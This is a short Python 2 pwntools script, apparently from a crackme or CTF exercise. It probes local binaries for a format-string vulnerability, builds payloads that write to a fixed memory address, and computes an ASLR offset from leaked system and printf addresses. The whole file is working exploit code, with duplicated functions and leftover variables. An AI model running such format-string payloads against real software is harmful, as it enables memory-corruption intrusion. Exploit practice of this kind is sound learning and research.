#!/usr/bin/env python2

import os
import re
import sys

from pwn import *

context.arch = "x86"
context.bits = 32

secretAddr = 0x0804a050
exe = "./target"

def findStack():
    padding = "BB"
    addr = "AAAA"
    searchFor = hex(unpack("AAAA"))
    retval = 0
    for i in range(1, 200):
        p = process(exe)
        myformat = "%{}$p".format(i)
        payload = padding+addr+myformat
        p.sendline(payload)
        log.info("payload = %s" % repr(payload))
        if p.recvregex(searchFor):
            retval = i
        p.close()
    print "Offset is {}".format(retval)
    return retval

def findOffset():
    padding = "BB"
    addr = "AAAA"
    searchFor = hex(unpack("AAAA"))
    retval = 0
    for i in range(1, 200):
        p = process(exe)
        myformat = "%{}$p".format(i)
        payload = padding+addr+myformat
        p.sendline(payload)
        log.info("payload = %s" % repr(payload))
        if p.recvregex(searchFor):
            retval = i
        p.close()
    print "Offset is {}".format(retval)
    return retval

secretAddr = 0x0804a050
writes = {secretAddr:   0xee,
          secretAddr+4: 0xff,
          secretAddr+8: 0xc0}

def jake():
    padding = "BB"
    addr = "AAAA"
    searchFor = hex(unpack("AAAA"))

    retval = 0
    for i in range(1, 20):
        p = process("./crackme0x00")
        myformat = "%{}$p".format(i)
        payload = padding+fmtstr_payload(15, writes, 15)
        p.sendline(payload)
        log.info("payload = %s" % repr(payload))
        log.info(i)
        print p.recvall()
        p.close()
    return retval


def findAslrOffset():
    p = process("./check") 
    retval = p.recvall()
    stackAddr = int(retval[12:20], 16)
    systemAddr = int(retval[33:41], 16)
    printfAddr = int(retval[54:64], 16)

    offset = printfAddr - systemAddr
    print "stack address:  0x%x" % stackAddr
    print "system address: 0x%x" % systemAddr
    print "printf address: 0x%x" % printfAddr
    print "ALSR offset:    0x%x" % offset
    return offset
    
findAslrOffset()
